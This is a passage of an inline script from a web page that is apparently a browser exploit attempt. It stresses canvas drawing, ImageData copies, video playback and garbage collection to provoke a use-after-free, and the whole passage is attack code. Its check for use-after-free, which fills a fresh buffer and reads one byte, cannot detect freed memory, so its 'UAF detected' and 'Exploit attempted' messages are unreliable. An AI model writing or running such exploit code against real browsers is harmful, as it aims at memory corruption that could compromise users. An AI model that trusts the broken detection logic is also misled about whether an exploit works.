    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        let attemptCount = 0;

        function stressGC() {
            for (let i = 0; i < 300; i++) {
                new ArrayBuffer(1024 * 1024);
            }
        }

        function drawOnCanvas() {
            ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
            ctx.fill();
            // Stress with ImageData
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            ctx.putImageData(imageData, 0, 0);
        }

        function triggerExploit() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;

            try {
                // Intensive drawing
                const drawInterval = setInterval(drawOnCanvas, 5);

                // Stress with multiple ImageData operations
                const imageData = ctx.createImageData(512, 512);
                for (let i = 0; i < imageData.data.length; i++) {
                    imageData.data[i] = Math.random() * 255;
                }
                ctx.putImageData(imageData, 0, 0);

                // Check for UAF
                setTimeout(() => {
                    const testBuf = new Uint8Array(4096);
                    testBuf.fill(0x46);
                    if (testBuf[0] !== 0x46) {
                        status.textContent = 'Early UAF detected!';
                        clearInterval(drawInterval);
                        video.pause();
                        return;
                    }
                    stressGC();
                    status.textContent = 'Exploit attempted!';
                    clearInterval(drawInterval);
                    video.pause();
                }, 500);
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = `Failed: ${err.message}`;
            }
        }

        document.getElementById('trigger').addEventListener('click', () => {
            try {
                video.play();
                triggerExploit();
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = `Failed: ${err.message}`;
            }
        });
